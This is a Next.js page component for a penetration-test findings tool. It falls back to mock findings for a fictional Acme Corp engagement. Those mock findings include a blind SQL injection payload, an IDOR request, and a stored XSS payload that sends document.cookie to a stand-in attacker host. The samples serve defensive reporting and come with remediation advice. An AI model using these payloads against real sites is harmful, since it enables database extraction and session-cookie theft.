import prisma from '@/lib/prisma';
import { FindingsManager } from '@/components/findings/findings-manager';

export const dynamic = 'force-dynamic';

export default async function FindingsPage({
  params
}: {
  params: Promise<{ id: string }>
}) {
  const { id } = await params;

  let engagement: any = null;
  try {
    engagement = await prisma.engagement.findUnique({
      where: { id },
      include: {
        findings: {
          orderBy: { cvssScore: 'desc' }
        }
      }
    });
  } catch (err) {
    console.warn('Prisma query failed, using mock data:', err);
  }

  if (!engagement) {
    engagement = {
      id,
      title: 'Acme Corp Q3 External Network Penetration Test',
      findings: [
        {
          id: 'f-1',
          title: 'SQL Injection in Login Portal',
          cweIdentifier: 'CWE-89',
          cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
          cvssScore: 9.8,
          severity: 'Critical',
          description: 'The login endpoint is vulnerable to time-based blind SQL injection in the username parameter, allowing unauthenticated database extraction.',
          proofOfConcept: `POST /api/v1/auth/login HTTP/1.1\nHost: portal.acme.corp\nContent-Type: application/json\n\n{\n  "username": "admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",\n  "password": "test"\n}`,
          remediation: 'Use parameterized queries / prepared statements with ORM or typed SQL bindings. Disable dynamic string interpolation in all data access layers.',
          status: 'REPORTED',
          updatedAt: new Date()
        },
        {
          id: 'f-2',
          title: 'Insecure Direct Object Reference (IDOR) on Invoices',
          cweIdentifier: 'CWE-639',
          cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N',
          cvssScore: 6.5,
          severity: 'High',
          description: 'Authenticated users can download arbitrary organizational invoices and statements by altering the numeric invoice ID in the retrieval URL.',
          proofOfConcept: `GET /api/billing/invoices/inv_998124/download HTTP/1.1\nAuthorization: Bearer <low_priv_token>\nHost: portal.acme.corp\n\n# Response: 200 OK with competitor invoice metadata`,
          remediation: 'Enforce tenant-level authorization checks before retrieving invoice entities. Validate user ownership against session organization ID.',
          status: 'FIX_COMMITTED',
          updatedAt: new Date()
        },
        {
          id: 'f-3',
          title: 'Cross-Site Scripting (XSS) in Dashboard Profile',
          cweIdentifier: 'CWE-79',
          cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N',
          cvssScore: 5.4,
          severity: 'Medium',
          description: 'Stored XSS vulnerability in the user profile bio field. Malicious scripts execute in the context of any administrator viewing the profile roster.',
          proofOfConcept: `<img src=x onerror="fetch('https://evil.attacker.io/leak?cookie='+document.cookie)">`,
          remediation: 'Sanitize HTML input using DOMPurify and context-aware encoding. Implement a strict Content-Security-Policy (CSP) restricting inline script execution.',
          status: 'ACKNOWLEDGED',
          updatedAt: new Date()
        }
      ]
    };
  }

  return (
    <FindingsManager
      engagementId={engagement.id}
      engagementTitle={engagement.title}
      initialFindings={engagement.findings || []}
    />
  );
}
